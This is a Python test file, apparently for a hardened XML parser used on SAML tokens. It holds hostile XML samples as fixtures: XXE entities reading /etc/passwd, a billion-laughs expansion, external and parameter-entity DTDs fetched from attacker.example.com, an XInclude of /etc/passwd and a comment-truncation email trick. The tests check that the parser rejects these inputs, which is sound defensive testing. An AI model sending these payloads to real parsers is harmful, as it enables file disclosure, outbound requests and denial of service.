import socket

import pytest
from lxml import etree

from token_inspector.xmlsafe import XMLRejected, parse_xml

XXE_FILE = b"""<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>
<r>&x;</r>"""

BILLION_LAUGHS = b"""<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<r>&lol3;</r>"""

EXTERNAL_DTD = b"""<?xml version="1.0"?>
<!DOCTYPE r SYSTEM "http://attacker.example.com/evil.dtd">
<r/>"""

PARAMETER_ENTITY = b"""<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY % p SYSTEM "http://attacker.example.com/p.dtd"> %p;]>
<r/>"""

XINCLUDE = b"""<r xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include href="file:///etc/passwd" parse="text"/></r>"""


@pytest.mark.parametrize(
    "payload",
    [XXE_FILE, BILLION_LAUGHS, EXTERNAL_DTD, PARAMETER_ENTITY],
    ids=["xxe-file", "billion-laughs", "external-dtd", "parameter-entity"],
)
def test_dangerous_xml_is_rejected(payload):
    with pytest.raises(XMLRejected):
        parse_xml(payload)


def test_xinclude_is_not_expanded():
    root = parse_xml(XINCLUDE)
    assert b"root:" not in etree.tostring(root)
    assert root[0].tag == "{http://www.w3.org/2001/XInclude}include"


def test_malformed_xml_is_rejected():
    with pytest.raises(XMLRejected, match="not well-formed"):
        parse_xml(b"<r><unclosed></r>")


def test_oversized_xml_is_rejected():
    with pytest.raises(XMLRejected, match="larger than"):
        parse_xml(b"<r>" + b"a" * (6 * 1024 * 1024) + b"</r>")


def test_comments_are_preserved():
    root = parse_xml(b"<r><n>user@example.com<!-- c -->.evil.example</n></r>")
    assert len(root[0]) == 1  # the comment node survives


def test_plain_xml_parses():
    root = parse_xml("<samlp:Response xmlns:samlp='urn:oasis:names:tc:SAML:2.0:protocol'/>")
    assert root.tag.endswith("Response")


def test_network_guard_is_active():
    with pytest.raises(AssertionError, match="network"):
        socket.create_connection(("example.com", 80))
